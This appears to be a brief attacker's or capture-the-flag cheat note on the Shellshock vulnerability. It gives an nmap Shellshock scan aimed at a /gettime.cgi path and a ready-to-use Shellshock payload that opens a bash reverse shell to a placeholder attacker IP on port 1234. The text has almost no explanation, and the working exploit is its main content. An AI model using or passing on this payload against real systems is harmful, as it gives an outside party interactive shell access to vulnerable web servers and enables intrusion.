shellshock vuln

```bash
nmap --script=httpshellshock --script-args "http-shellshock.uri=/gettime.cgi"
```
```bash
() { : ; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/**hacker_ip**/1234 0>&1'
```

todo: /gettime.cgi